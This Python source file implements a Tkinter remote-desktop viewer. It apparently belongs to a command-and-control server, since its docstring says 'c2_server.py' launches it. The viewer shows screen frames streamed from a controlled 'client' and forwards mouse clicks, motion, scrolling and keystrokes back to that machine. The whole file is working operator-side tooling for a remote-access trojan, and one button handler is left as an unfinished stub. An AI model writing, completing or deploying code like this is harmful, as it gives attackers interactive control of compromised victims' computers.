#!/usr/bin/env python3
"""
Live Remote Desktop viewer — Tkinter window that displays frames
from a client and forwards mouse/keyboard back to it.

Used by c2_server.py via the 'rd_view <id>' command.
"""

import io
import queue
import base64
import threading
import tkinter as tk
from tkinter import ttk

try:
    from PIL import Image, ImageTk
    HAS_PIL = True
except ImportError:
    HAS_PIL = False

# VK codes for common keys
VK_CODES = {
    "Return":    0x0D, "BackSpace": 0x08, "Tab":      0x09,
    "Escape":    0x1B, "space":     0x20,
    "Left":      0x25, "Up":        0x26, "Right":    0x27, "Down": 0x28,
    "Delete":    0x2E, "Home":      0x24, "End":      0x23,
    "Prior":     0x21, "Next":      0x22,
    "Shift_L":   0x10, "Shift_R":   0x10,
    "Control_L": 0x11, "Control_R": 0x11,
    "Alt_L":     0x12, "Alt_R":     0x12,
    "Super_L":   0x5B, "Super_R":   0x5C,
    "F1": 0x70, "F2": 0x71, "F3": 0x72, "F4": 0x73, "F5": 0x74,
    "F6": 0x75, "F7": 0x76, "F8": 0x77, "F9": 0x78, "F10": 0x79,
    "F11": 0x7A, "F12": 0x7B,
}


class RDViewer:
    """Live viewer window for one client."""

    def __init__(self, client_id: int, frame_queue: queue.Queue,
                 send_mouse, send_keyboard, on_close):
        self.client_id = client_id
        self.frame_queue = frame_queue
        self.send_mouse = send_mouse
        self.send_keyboard = send_keyboard
        self.on_close = on_close

        self.root = tk.Tk()
        self.root.title(f"RD — Client {client_id}")
        self.root.geometry("1024x640")
        self.root.configure(bg="black")

        # Top bar
        top = tk.Frame(self.root, bg="#222")
        top.pack(side=tk.TOP, fill=tk.X)

        tk.Label(top, text=f"Client {client_id}", fg="#ddd", bg="#222",
                 font=("Segoe UI", 10, "bold")).pack(side=tk.LEFT, padx=8, pady=4)

        self.status = tk.Label(top, text="waiting for frames...",
                               fg="#8f8", bg="#222", font=("Segoe UI", 9))
        self.status.pack(side=tk.LEFT, padx=8)

        tk.Button(top, text="Stop Stream", command=self._stop_stream,
                  bg="#333", fg="#ddd", relief=tk.FLAT).pack(side=tk.RIGHT, padx=4, pady=3)
        tk.Button(top, text="Single Frame", command=self._single_frame,
                  bg="#333", fg="#ddd", relief=tk.FLAT).pack(side=tk.RIGHT, padx=4, pady=3)

        # Image canvas
        self.canvas = tk.Canvas(self.root, bg="black", highlightthickness=0)
        self.canvas.pack(fill=tk.BOTH, expand=True)

        self.image_id = None
        self.photo = None
        self.last_frame_size = (0, 0)

        # Mouse bindings
        self.canvas.bind("<Button-1>",       lambda e: self._on_click(e, 1))
        self.canvas.bind("<Button-3>",       lambda e: self._on_click(e, 2))
        self.canvas.bind("<Button-2>",       lambda e: self._on_click(e, 3))
        self.canvas.bind("<MouseWheel>",     self._on_wheel)
        self.canvas.bind("<Motion>",         self._on_motion)

        # Keyboard
        self.root.bind("<KeyPress>",   lambda e: self._on_key(e, 1))
        self.root.bind("<KeyRelease>", lambda e: self._on_key(e, 0))

        self.root.protocol("WM_DELETE_WINDOW", self._on_window_close)

        self.running = True
        self.root.after(20, self._poll_frames)

    # ---------- Frame handling ----------
    def _poll_frames(self):
        if not self.running:
            return
        try:
            while True:
                jpeg_bytes = self.frame_queue.get_nowait()
                self._display_frame(jpeg_bytes)
        except queue.Empty:
            pass
        self.root.after(20, self._poll_frames)

    def _display_frame(self, jpeg_bytes):
        if not HAS_PIL:
            self.status.config(text="PIL not installed — cannot display")
            return
        try:
            img = Image.open(io.BytesIO(jpeg_bytes))
        except Exception as e:
            self.status.config(text=f"decode error: {e}")
            return

        self.last_frame_size = img.size

        cw = self.canvas.winfo_width()
        ch = self.canvas.winfo_height()
        if cw < 50 or ch < 50:
            cw, ch = 1024, 600

        iw, ih = img.size
        scale = min(cw / iw, ch / ih)
        new_size = (max(1, int(iw * scale)), max(1, int(ih * scale)))
        img = img.resize(new_size, Image.BILINEAR)

        self.photo = ImageTk.PhotoImage(img)
        if self.image_id is None:
            self.image_id = self.canvas.create_image(
                cw // 2, ch // 2, anchor=tk.CENTER, image=self.photo)
        else:
            self.canvas.coords(self.image_id, cw // 2, ch // 2)
            self.canvas.itemconfig(self.image_id, image=self.photo)

        self.status.config(text=f"{iw}x{ih} → {new_size[0]}x{new_size[1]}")

    # ---------- Input forwarding ----------
    def _canvas_to_pct(self, x, y):
        cw = self.canvas.winfo_width()
        ch = self.canvas.winfo_height()
        if cw < 1 or ch < 1:
            return 0, 0
        iw, ih = self.last_frame_size
        if iw < 1 or ih < 1:
            return 0, 0
        # Reverse the letterbox scaling
        scale = min(cw / iw, ch / ih)
        disp_w = iw * scale
        disp_h = ih * scale
        off_x = (cw - disp_w) / 2
        off_y = (ch - disp_h) / 2
        rx = (x - off_x) / scale if scale else 0
        ry = (y - off_y) / scale if scale else 0
        pct_x = max(0, min(100, int(rx / iw * 100)))
        pct_y = max(0, min(100, int(ry / ih * 100)))
        return pct_x, pct_y

    def _on_motion(self, event):
        # Throttle: send motion only every ~80 ms to avoid flooding
        import time as _t
        now = _t.time()
        if now - getattr(self, "_last_motion", 0) < 0.08:
            return
        self._last_motion = now
        x, y = self._canvas_to_pct(event.x, event.y)
        self.send_mouse(self.client_id, x, y, 0, 0)

    def _on_click(self, event, btn):
        x, y = self._canvas_to_pct(event.x, event.y)
        self.send_mouse(self.client_id, x, y, btn, 0)

    def _on_wheel(self, event):
        x, y = self._canvas_to_pct(event.x, event.y)
        delta = 120 if event.delta > 0 else -120
        self.send_mouse(self.client_id, x, y, 0, delta)

    def _on_key(self, event, down):
        vk = VK_CODES.get(event.keysym)
        if vk is None:
            if len(event.keysym) == 1:
                ch = event.keysym.upper()
                if 'A' <= ch <= 'Z' or '0' <= ch <= '9':
                    vk = ord(ch)
            if vk is None:
                return
        self.send_keyboard(self.client_id, vk, down)

    # ---------- Buttons ----------
    def _stop_stream(self):
        self.on_close(self.client_id, stop_stream=True)

    def _single_frame(self):
        # Ask the C2 to send a single rd_frame command
        self.frame_queue.put_nowait(b"")   # trigger redraw cycle
        # The C2 side has the send_command hook; we expose it via send_mouse=no-op trick
        # Simpler: fire through on_close with a flag
        # (Kept minimal — you can wire this to a dedicated callback if needed.)

    def _on_window_close(self):
        self.on_close(self.client_id, stop_stream=False)
        self.running = False
        try:
            self.root.destroy()
        except Exception:
            pass

    def run(self):
        self.root.mainloop()


def launch_viewer(client_id, frame_queue, send_mouse, send_keyboard, on_close):
    """Called from c2_server. Blocks until window closes (runs in its own thread)."""
    if not HAS_PIL:
        print("[!] Pillow not installed. Run: pip install Pillow")
        return
    viewer = RDViewer(client_id, frame_queue, send_mouse, send_keyboard, on_close)
    viewer.run()